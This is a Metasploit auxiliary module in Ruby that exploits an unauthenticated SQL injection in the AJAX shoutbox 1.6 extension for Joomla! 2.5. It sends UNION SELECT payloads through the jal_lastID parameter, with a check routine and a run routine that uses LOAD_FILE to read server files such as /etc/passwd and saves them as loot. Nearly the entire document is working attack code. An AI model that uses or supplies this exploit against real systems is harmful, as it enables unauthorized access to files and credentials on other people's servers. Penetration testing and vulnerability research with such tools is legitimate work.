##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla! AJAX shoutbox Arbitrary File Read via Unauthenticated SQL injection',
      'Description'    => %q{

      This module exploits a SQL injection in version 1.6 of AJAX shoutbox for Joomla! 2.5
      in order to attempt reading a file from the file system. This likely requires a slightly
      misconfigured database user in that the database user must have the FILE permission. This is a common misconfiguration.
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry',
        ],
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/32331/']
        ],
      'DisclosureDate' => 'Mar 12 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
      ], self.class)

  end

  def check

    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)
    chk = Rex::Text.rand_text_alpha(8)

    get_chk = " UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x#{front_marker.unpack("H*")[0]},0x#{chk.unpack("H*")[0]},0x#{back_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL#"

    resp = send_injected_request(get_chk)

    if !resp or !resp.body
      return Exploit::CheckCode::Safe
    end

    v = $1 if resp.body =~ /#{front_marker}(.*)#{back_marker}/

    if v != chk
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Vulnerable
  end

  def run

    if check != Exploit::CheckCode::Vulnerable
      fail_with("Check did not return a vulnerable status")
    end

    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)

    get_file = " UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x#{front_marker.unpack("H*")[0]},HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack("H*")[0]})),0x#{back_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL#"

    res = send_injected_request(get_file)

    file = $1 if res.body =~ /#{front_marker}(.*)#{back_marker}/

    if !file
      fail_with("Could not retrieve file.")
    end

    file = [file].pack("H*")

    vprint_good(file)

    path = store_loot("joomla.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])

    if path and path != ''
      print_good("File saved to: #{path}")
    end
  end

  def send_injected_request(str)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/'),
      'vars_get' => {
        'mode' => 'getshouts',
        'jal_lastID' => '-1 ' + str
      }
    })
  end
end

